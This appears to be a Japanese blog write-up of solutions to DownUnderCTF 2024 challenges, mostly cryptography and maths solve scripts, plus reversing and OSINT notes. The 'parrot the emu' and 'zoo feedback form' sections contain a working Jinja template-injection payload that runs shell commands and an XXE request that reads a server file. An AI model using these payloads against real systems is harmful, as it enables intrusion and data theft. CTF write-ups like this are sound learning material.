@@ -1,0 +1,436 @@
+[https://play.duc.tf/:title=DownUnderCTF 2024] に参加した。日本時間で 2024-07-05 18:30 から 2024-07-07 18:30 まで。
+
+結果は 287/1515 位。
+
+* 解法集
+** beginner
+*** parrot the emu
+
+jinja テンプレートエンジンに任意のユーザー入力が与えられることを利用した脆弱性がある。
+
+<code>{{request.environ.__getitem__('werkzeug.socket').dup.__func__.__globals__.__getitem__('o''s')}}</code> で Python での os にあたるものが手に入る。
+
+<code>{{request.environ.__getitem__('werkzeug.socket').dup.__func__.__globals__.__getitem__('o''s').__builtins__.__getitem__('__import__')('subprocess').check_output(('ls','-l'))}} </code>などで任意コマンドが実行できるので、cat flag を実行すれば良い。
+参考: https://blog.hamayanhamayan.com/entry/2021/12/19/191043
+
+*** Sun Zi's Perfect Math Class
+
+1000 <= x <= 1100
+x = 2 (mod 3)
+x = 4 (mod 5)
+x = 5 (mod 7)
+を解けば良い。下三つの制約は x = 89 (mod 105) と翻訳できるので、条件を満たすのは 105 * 9 + 89 = 1034 である。
+
+これを入力すると以下のような方程式が渡される:
+[tex:c_1 = m^3 \pmod{n_1}, c_2 = m^3 \pmod{n_2}, c_3 = m^3 \pmod{n_3}]
+これも中国剰余定理を使えば [tex: c = m^3 \pmod{n_1n_2n_3}] なる c が得られ、このような c は m^3 に等しいので立法根を計算すれば良い。
+
+>|python|
+from Crypto.Util.number import *
+
+e = 3
+
+c_1 = 105001824161664003599422656864176455171381720653815905925856548632486703162518989165039084097502312226864233302621924809266126953771761669365659646250634187967109683742983039295269237675751525196938138071285014551966913785883051544245059293702943821571213612968127810604163575545004589035344590577094378024637
+
+c_2 = 31631442837619174301627703920800905351561747632091670091370206898569727230073839052473051336225502632628636256671728802750596833679629890303700500900722642779064628589492559614751281751964622696427520120657753178654351971238020964729065716984136077048928869596095134253387969208375978930557763221971977878737
+
+c_3 = 64864977037231624991423831965394304787965838591735479931470076118956460041888044329021534008265748308238833071879576193558419510910272917201870797698253331425756509041685848066195410586013190421426307862029999566951239891512032198024716311786896333047799598891440799810584167402219122283692655717691362258659
+
+n_1 = 147896270072551360195753454363282299426062485174745759351211846489928910241753224819735285744845837638083944350358908785909584262132415921461693027899236186075383010852224067091477810924118719861660629389172820727449033189259975221664580227157731435894163917841980802021068840549853299166437257181072372761693
+
+n_2 = 95979365485314068430194308015982074476106529222534317931594712046922760584774363858267995698339417335986543347292707495833182921439398983540425004105990583813113065124836795470760324876649225576921655233346630422669551713602423987793822459296761403456611062240111812805323779302474406733327110287422659815403
+
+n_3 = 95649308318281674792416471616635514342255502211688462925255401503618542159533496090638947784818456347896833168508179425853277740290242297445486511810651365722908240687732315319340403048931123530435501371881740859335793804194315675972192649001074378934213623075830325229416830786633930007188095897620439987817
+
+
+# Slightly modified version of https://stackoverflow.com/questions/356090/how-to-compute-the-nth-root-of-a-very-big-integer
+def find_invpow(x,n):
+    """Finds the integer component of the n'th root of x,
+    an integer such that y ** n <= x < (y + 1) ** n.
+    """
+    high = 1
+    while high ** n <= x:
+        high *= 2
+    low = high//2
+    while low < high:
+        mid = (low + high) // 2
+        if low < mid and mid**n < x:
+            low = mid
+        elif high > mid and mid**n > x:
+            high = mid
+        else:
+            return mid
+    return mid + 1
+
+
+c = 0
+n = 1
+for (cc, nn) in [(c_1, n_1), (c_2, n_2), (c_3, n_3)]:
+    new_c = (c * nn * inverse(nn, n) + cc * n * inverse(n, nn)) % (n * nn)
+    c = new_c
+    n *= nn
+
+m = find_invpow(c, 3)
+print(long_to_bytes(m))
+||<
+
+*** zoo feedback form
+
+Dockerfile を読むと、フラグが /app/flag.txt にあることがわかる。
+
+https://blog.hamayanhamayan.com/entry/2021/12/04/114351 の LFI を行う。
+
+<code>curl -X POST &#039;https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev/&#039; -H &quot;Content-Type: application/xml&quot; -d &#039;&lt;!DOCTYPE root [&lt;!ENTITY e SYSTEM &quot;file:///app/flag.txt&quot;&gt;]&gt;&lt;root&gt;&lt;feedback&gt;&amp;e;&lt;/feedback&gt;&lt;/root&gt;&#039;</code> でいけた。
+
+- -H "Content-Type: application/xml" は必須。これがないと Error parsing XML: Document is empty, line 1, column 1 と言われる。
+- &lt;feedback&gt;&lt;/feedback&gt; で囲むのは必須。これがないとエラー。
+
+*** shufflebox
+大きさ 16 の permutation を求める問題。
+1 行目と 2 行目で各位置での文字の組み合わせはすべて相異なるため、それを利用して permutation を特定すれば良い。
+
+>|go|
+package main
+
+var (
+	s1         = "ccaccdabdbdbbada"
+	s2         = "bcaadbdcdbcdacab"
+	cipherText = "owuwspdgrtejiiud"
+)
+
+func main() {
+	perm := make([]int, 16)
+	for i := 0; i < 16; i++ {
+		index1 := s1[i] - 'a'
+		index2 := s2[i] - 'a'
+		perm[i] = int(index1)*4 + int(index2)
+	}
+	plainText := make([]byte, 16)
+	for i := 0; i < 16; i++ {
+		plainText[perm[i]] = cipherText[i]
+	}
+	println("DUCTF{" + string(plainText) + "}")
+}
+||<
+
+*** number mashing
+[https://github.com/NationalSecurityAgency/ghidra:title=Ghidra] で逆コンパイルをしてみた。以下のようになった。
+>|c|
+  __isoc99_scanf("%d %d",&a,&b);
+  if (((a == 0) || (b == 0)) || (b == 1)) {
+    puts("Nope!");
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  local_114 = 0;
+  if (b != 0) {
+    local_114 = a / b;
+  }
+  if (local_114 != a) {
+    puts("Nope!");
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+||<
+ここから、a != 0 && b != 0 && b != 1 && a / b == a が成立するような int a, b を求める必要があることがわかる。
+a = (-1) << 31, b = -1 とすればよい。
+
+
+** crypto
+
+*** decrypt then eval
+AES-CFB の仕様から、16 バイト以下の平文・暗号文であれば、単にセッションごとに固定の乱数と xor しているのと変わらない。
+
+eval は数字の列をそのまま値として評価するので、数字列になるように 1 文字ごとに調整していけば乱数がわかる。
+最後に FLAG を評価させれば良い。
+
+>|python|
+from pwn import *
+import re
+
+script = 'FLAG'
+
+io = remote('2024.ductf.dev', 30020)
+
+pat = re.compile(b'^[0-9]*\n$')
+
+perm = []
+for i in range(16):
+    for j in range(16):
+        perm.append(j * 16 + i)
+
+key = []
+for pos in range(min(len(script), 16)):
+    for i in perm:
+        io.recvuntil(b'ct: ')
+        ct = b''
+        for k in key:
+            ct += format(k ^ 0x31, '02x').encode('utf-8')
+        ct += format(i, '02x').encode('utf-8')
+        io.sendline(ct)
+        line = io.recvline()
+        print(pos, ct, line)
+        if line != b'invalid ct!\n' and pat.match(line) and len(line) == pos + 2:
+            last = line[-2]
+            key.append(last ^ i)
+            break
+
+ct = b''
+for i in range(len(script)):
+    ct += format(ord(script[i]) ^ key[i], '02x').encode('utf-8')
+
+io.recvuntil(b'ct: ')
+io.sendline(ct)
+print(io.recvline())
+||<
+
+*** my array generator
+レジスターは 32-bit で 128 個あり、鍵は 32 バイトである。
+鍵が 16 倍に伸長された後 update されるのだが、レジスターの値としてあり得るのは鍵 (8 * 32-bit) および 0xffff_ffff の線型結合で得られる 2^9 通りである。
+
+0xffff_ffff を除くと純粋な線形変換であり、なおかつ鍵はすべて ASCII であるため 0xffff_ffff が含まれているかどうかは簡単にわかる。(各バイトが 0x80 以上かどうかを見れば良い。)
+
+>|python|
+import random
+
+KEY_SIZE = 32
+F = 2**14
+
+
+class MyArrayGenerator:
+    def __init__(self, n_registers: int = 128):
+        self.n_registers = n_registers
+        random.seed(1234)
+
+    def prepare(self):
+        self.registers = [0 for _ in range(self.n_registers)]
+        self.key_extension()
+
+        self.carry = self.registers.pop()
+        self.key_initialisation(F)
+
+    def key_extension(self):
+        for i in range(len(self.registers)):
+            j = i % (KEY_SIZE // 4)
+            self.registers[i] = 1 << j
+
+    def key_initialisation(self, F: int):
+        for _ in range(F):
+            self.update()
+
+    def shift(self):
+        self.registers = self.registers[1:]
+
+    def update(self):
+        r0, r1, r2, r3 = self.registers[:4]
+
+        self.carry ^= r1
+
+        self.shift()
+        self.registers.append(self.registers[-1] ^ self.carry)
+
+    def get_keystream(self) -> tuple[int, int]:
+        byte_index = random.randint(0, 3)
+        return (self.registers[-1], byte_index)
+
+plaintext = "144f3fe104f33fb1db5cd69e1cc18ceb6abbb2424bbd7ed83835d6c4af215ab9865379bf361f8c145689fa7cfa1c8a0c0254f0ef9fefb9559c45e2550d90de096e6b390280009763416f43b1c52005009f499d5c221f7b7b32f9f1f766b8057d5daf1d46a9e6547b2b655df872312a155a24f3ce66a08455006d54dcb3fea2b692010892d63503009904505d729e4b06784347d9d8f097352b73e98129122f59e62886527326022a529b58fcfe2a038b54053cc57123032aba5356e20641fba1ae9bd5398916e29cd2ec2ad01dad60ab2f4b3cbdc17afdfd5f777ac341c0a94581fc1f87782103ab61137f24b605266b8d20a2b295fee2819ce56b4436b7e106e613c6f3a6fcb2f9417b34bbec90874701b4a9402afb242ceab4c7f873a95537334b8ccab122a6dd46fcd818a11b65f3e37863ec1c27c5f832ab3e8c42a26db4d5d6362deb9af2d736390722d28c0e809f0f58b6f3cb079b64f22eeb4a4fe56307b5f4829f218afd7a13e9d1a7f3bcc4dfee5d83d4600c6c1cf69530a3413568a31251e533c9be324e7bb7b977dce081f82793001457f17383a58d8eb8f7dfc72c67f7ca0ac952257e5bf5881255564867ab8e8198c314309e211dd3d29b88d206c6111ca98aa9bf1f7c8ae2ebbd6fa1f73229b349c76bccc1c0e3460bcb350c06efac3d1503273da0f388e35fc7e4d8e22bcbe5204d7e3c05019689957b80d28bdcf4ff3536a640c0aca822e0943e559c7e5bc475aebc4459f55e95e0972e76d2ca23a7e5dd5e9762bc360dbfed8c2459cc54d5f1825dec6a0ef09de00bc6b9e87d8b8bfeca3722de36116cb549d7b45d4b7ee72af3c9d78e8358e33b2aa0ce3f91380da77cfc32d9e3f635703519da183aefe078dda73fc450b8cc899a4f90cee20597a5be5eec67e98f69f9801b6063d77c270c821ae71e1fb16a1fe66c68fc39d3c1ff75e1d78a2a42cc0bd737b90d6c22ada2e1ef041094adb7c341cb228d2b5f353bef801a9ac657274196ef91212c310eb41b6e7aa6c03178d3c8796731bfe41e54ee2092d5ae85679e77d2872761bf6001aefe68c83ea4b1968af3ab81de5fbe163eddb86a84efcdcb7cd77a335b1ebd75a6b2b913c6f579b4e80c21321cdc53bc5753d3d6f446d5cecc962c6f308ae80441026378a0556b49a40d62a500839197ae7b44a8595dee3b9ec358a495c73009d82f948b560a41fcad13530f81fe94604e1f95fd9fc47b0e94f1693f28aa470eb07f1f1ce73c40a818c517a9af0eb8b655e8de065b791291d1be9c3d4ead2aca027e4303f04650a6a812d156711dd29d54a8b84362e3d186c1ffee12c72e9a907c41b1963ab30d02dffbaf04e2c8d5fc383f8d469ae708fd91730db423a2a6d4eb6503b74923c04d754f190ab7bee78a53540a82e7b98260d84ac0159ff2759a0cbce70885a9ee46e0ed88091d1ed93146e916be84b28bb0a5e808684769d68fd7f392952d1a6d3b5a858eef6411abe859cb6a78a16d8f269a8d17d8bf81782695b3f41f15e90d03b0103c7e2ee3010db34b699f1354d9a3ecf3a1f7da0e510af3301f76dad2f180d75368f6fee0c673c3d20a6b02efd33c742a2cdaafa1365e797652816a2a443fff8efff3ff761b235b5959ee0cbbc22f56fbb1f8869e048760a3d5fcc17fd12433b9e3721e2197d703ae7d3a4c01a9e370541a9963190d63d4390697c65d1f5f4bb33b4237c1a08ef6503f4d6fae907b71fbd528668ca3eeb6dfd3a6421675cfc973e398f671f35f0194e3ac69bfbef73dd29af81fe3249ba829af79bb3ea26808512f"
+ciphertext = "3810d227b7ca7cb8cc9afa35679e154b763623db53428127a858c5c75e199088883d9b94bb4b4cbd3276e3c2e9d132832067362974d6e4a3898376003da1aba9ece6ff649800979c58d450216dc4cfce6e427f7736b444afd5f9ac548ad40f0d510ff07f43051772678671adf691e47b46c04c577e5f7baae92c070e9d660dbcd291b055dc47026e845bdcbe5e357bc8a9bc205223ee16a440d3883d1976a569341917791426022a3dc7f4d1ea77c47e1637842194c72344f187dad900146a6fd110254d79160faca1dfb4856636153abe7aad92a685fdfd49e5f91124a7d0b1d331eef772ef0dc4b34c0caf4950e90dee3e17c6f21f82def29752edf0f39d596b8be79598a069954b6018e4fe90347c7342be34d5afb6143987d5c139f47118ab4b8c354e22bf99c06fc4812b8a16ac782d0d8869b6478a12c5eca731bee0423d12bbd218aacadd1bed74e446c8c1b1fcee577b6bf9eaab0ae9e842b4ddb63c7517d02b599af3918fe741434a35f00052e7b64740dc4a33bd3b78a1cdcc8abc441247b99fe2dbfdd8eaa92adfc715b3e52d8e2b0003c9783e6878d1c783950ad71307076a699ee9eba4bf2a84a1e217146f1ac51c5867a24c533d426f9820ea0c2251339034d02fee4422d1067b842aaa0b3cc7dd831002bef262d4e8faa42762104a836928cc969862372e55b7eeeac22029ba3d89c2ca26aab75dc47b802d6d4e8d936b962ad1f3f3c9769b0f4df5804f9d5d7410ef1b2acc1d6a0baea376c5be0f0d29296b5a7a9308ae0aee82d0756cdc13bbd67c3cab525cc26d93469646821b2882954576b7c3bc5ef2ad65c65c41764727c875113bde86b55fd5a0ce9d03419d39dc895f12719289e16a6aeacab7cf70d52144a41562f2018d84a2cf0242e861a926f1194ab6fc52f93ba20400a302b621b014125e1cbf7105284c62b71249a624a179d728b811e7258a0fb3ec03c163c195fd697ea5ed63db4134dde26a15a5a589f5ba51f5db8cd0a76500a3a111610988cfdaf8de3e7823d66e0afa2df62788b359989e0e88a36733bce1adf3730d6b581453273cb38abade61939bc5316ad76268759ff43c5f5ebac24358f08fdbbbc826e66e6dc5e0c77adeef8db54453435745709c9bd875a85da5e0a939c69c2805cdf8f8a05ae0d1456d5269a045a86a05fd2be3f92ef217cb0c3e95f8f390cfd8c5779ba0468768164c23c59a193dee0af396ba58e816e369bb3d56b8b428048832d23c1288e025bafa380750e803260a65b97f359811643563c3d04e717765f79ce3f11340eb6931c3e3ce71852d1c9b9c2acba4107329cb407ee7232256567c0d3a2a03a4cb9675c8b40e907705c5552c8e4cea4f57759171c2cd4de2c96c9b8071aa26976028d76b365b48a85c1a7ebf5eeb7714126ae93fae26ac69ce1eacc928669e6f88171f1288668f0d146f2265787224cfdfddaef239286c68bbc54702763d72239b77b9d84807a01717b7d6791838381c2c753a008f4eb52ceb289eb979e184c426e8d76fe8d0d1f55d74ecd1593019f94956757f91c3b76f057153ba720bc1caa7d1285397e0bac4aa12635864186f67d376bb8527910f2df0a12c0d0d50952e763b74f06ec033e3ddde9430531953def2f400604ea5eb1d5be2cbf3dfaec238ca2efe5b73c6cabbf017d73582d3f712c67debd8d5f2509bb6dab20897150b4549c44bb33ba4768bcf9290360f7ecf3ba988d3ab20ca4d0028e81d4e1d7770ed4734d76472eb9b630515553be84dfa4ad8c6f200ab098e5709966cc659938082a2955cd740"
+
+p = bytes.fromhex(plaintext)
+c = bytes.fromhex(ciphertext)
+
+flag = ['?'] * 32
+cipher = MyArrayGenerator()
+cipher.prepare()
+for i in range(len(p)):
+    cipher.update()
+    (comb, r) = cipher.get_keystream()
+    d = p[i] ^ c[i]
+    if d >= 128:
+        d ^= 0xff
+    if comb & -comb == comb :#and comb != 0:
+        index = (comb - 1).bit_count()
+        flag[index * 4 + 3 - r] = chr(d)
+
+print("".join(flag))
+||<
+*** three line crypto
+頻度分析が使えそう。
+
+ガチャガチャいじっている最中に [https://anastrophe.uchicago.edu/cgi-bin/perseus/citequery3.pl?dbname=LatinAugust21&getid=1&query=Verg.%20G.%201.257] を見つけた。
+これを参考に平文を得て、平文の中の DUCTF という文字列を探せば良い。最終的なコードは以下のようになった。
+>|python|
+f = open("passage.enc.txt", "rb")
+buf = f.read()
+for l in range(2, 6):
+    tabl = {}
+    for i in range(len(buf) - l + 1):
+        tabl[buf[i:i+l]] = tabl.get(buf[i:i+l], 0) + 1
+
+    tabl_freq = sorted(tabl.items(), key=lambda x: x[1], reverse=True)
+    print(tabl_freq[:10])
+
+# headfreq
+for l in range(2, 10):
+    head = buf[:l]
+    f = 0
+    headnoncap = (head[0] ^ 0x20).to_bytes(1) + head[1:]
+    fnoncap = 0
+    for i in range(0, len(buf) - l + 1):
+        if buf[i:i+l] == head:
+            f += 1
+        if buf[i:i+l] == headnoncap:
+            fnoncap += 1
+    print(f'headfreq: {l} {f} {fnoncap}')
+
+known = [
+    (b'\x88\x13\xc0\x0bn', b' the '),
+    (b'\x00\x30\x9c\x0f\xe5\x88', b'\x00What '),
+    (b'\x10\x9c\x0f\xe5\x88', b'what '),
+    # (buf[:16], b'What makes the co'),
+    (buf[40:40+11], b'what star\nM'),
+    (buf[626:626+8], b' the war'),
+    (buf[2071 - 1:2071+14], b' what thou wilt'),
+    (buf[2647:2647+13], b' the groaning'),
+    (buf[2721:2721+12], b' the craving'),
+    (buf[3721:3721+30], b' the clods lie bare till baked'),
+    (buf[4736:4736+45], b' the light stubble burn with crackling flames'),
+    # (buf[2076:2076+7], b'thought'),
+]
+
+rand = [None] * 16
+for cipher, plain in known:
+    for i in range(len(cipher) - 1):
+        index = plain[i] & 15
+        newval = cipher[i + 1] ^ plain[i + 1]
+        if rand[index] is not None and rand[index] != newval:
+            print(f'Conflict at index {index}: {rand[index]} != {newval}')
+        rand[index] = newval
+
+print(rand)
+
+y = 0
+
+pos = 0
+
+conts = []
+now = []
+nowcipher = []
+while pos < len(buf):
+    for k in known:
+        if buf[pos:min(len(buf), pos+len(k[0]))] == k[0]:
+            pos += len(k[0])
+            y = k[1][-1]
+            now += list(k[1])
+            nowcipher += list(k[0])
+            break
+    x = buf[pos]
+    if y is None or rand[y % 16] is None:
+        y = None
+        if len(now) > 0:
+            conts.append((pos - len(now), bytes(now), bytes(nowcipher)))
+            now = []
+            nowcipher = []
+    else:
+        y = rand[y % 16] ^ x
+        now.append(y)
+        nowcipher.append(x)
+    pos += 1
+
+if all(e is not None for e in rand):
+    y = 0
+    for i in range(len(buf) - 1):
+        x = buf[i]
+        y = rand[y % 16] ^ x
+        print(chr(y), end='')
+else:
+    for e in conts:
+        print(e)
+||<
+
+*** V for Vieta
+a^2 + ab + b^2 = u^2(2ab + 1) を a, b >= 2^2048 の条件で解く必要がある。
+
+調べると [https://math.stackexchange.com/questions/28438/alternative-proof-that-a2b2-ab1-is-a-square-when-its-an-integer:title=Math StackExchange] に記事が見つかるが、これの応用で、a = u, b = 2u^3-u は解の一つである。
+(a, b) = (a1, b1) (a1 <= b1) が解の一つであるとき、a2 = b1*(u^2 - 1) - a1 とすれば (a2, b1) は新しい解である。これを利用してより大きい解が得られる。
+
+>|python|
+from pwn import *
+import json
+
+# Slightly modified version of https://stackoverflow.com/questions/356090/how-to-compute-the-nth-root-of-a-very-big-integer
+def find_invpow(x,n):
+    """Finds the integer component of the n'th root of x,
+    an integer such that y ** n <= x < (y + 1) ** n.
+    """
+    high = 1
+    while high ** n <= x:
+        high *= 2
+    low = high//2
+    while low < high:
+        mid = (low + high) // 2
+        if low < mid and mid**n < x:
+            low = mid
+        elif high > mid and mid**n > x:
+            high = mid
+        else:
+            return mid
+    return mid + 1
+
+
+def find(u: int) -> tuple[int, int]:
+    a = u
+    b = 2 * u*u*u - u
+    while min(a, b) < 2**2048:
+        assert a * a + a * b + b * b == u * u * (2 * a * b + 1)
+        a2 = b * (2 * u * u - 1) - a
+        a = b
+        b = a2
+    return (a, b)
+
+io = remote("2024.ductf.dev", 30018)
+
+io.readline()
+while True:
+    conf = io.readline()
+    conf = json.loads(conf)
+    if "flag" in conf:
+        print(conf["flag"])
+        exit()
+    if "k" not in conf:
+        print(conf)
+        exit(1)
+    k = int(conf["k"])
+    u = find_invpow(k, 2)
+    a, b = find(u)
+    io.sendline(json.dumps({"a": a, "b": b}).encode('utf-8'))
+||<
+
+** misc
+*** discord
+この CTF 用の discord で特定人物の発言を調べる (<code>from: _hex_bug</code>) と見つかる。
+
+** osint
+*** offtheramp
+
+exiftool で調べると以下の情報がわかる。
+
+>||
+$ exiftool offtheramp.jpeg | grep 'GPS Pos'
+GPS Position                    : 38 deg 9' 15.95" S, 145 deg 6' 29.69" E
+||<
+
+これは https://www.google.com/maps/place/38%C2%B009'16.0%22S+145%C2%B006'29.7%22E/@-38.1544928,145.1055938,17z/data=!4m4!3m3!8m2!3d-38.1544306!4d145.1082472?entry=ttu であり、
+見えているのは Olivers Hill Boat Ramp であることがわかる。
+
+*** cityviews
+Melbourne, Australia にある 3AW のビルの写真であり、東南東から撮影している。東南東の近隣のホテルを探しまくったところ、Hotel Indigo Melbourne on Flinders で正解になった。
+
+* まとめ
+公式解説は以下のリンクから得られる。
+[https://github.com/DownUnderCTF/Challenges_2024_Public:embed:cite]
+反省点は
+(i) 途中で息切れして、hardware, forensics の問題を見る余裕がなかった
+(ii) pwn がかなり苦手で、解くための手立てが皆無だった
+(iii) web 問題が一切解けなかった
+あたりだと思われる。
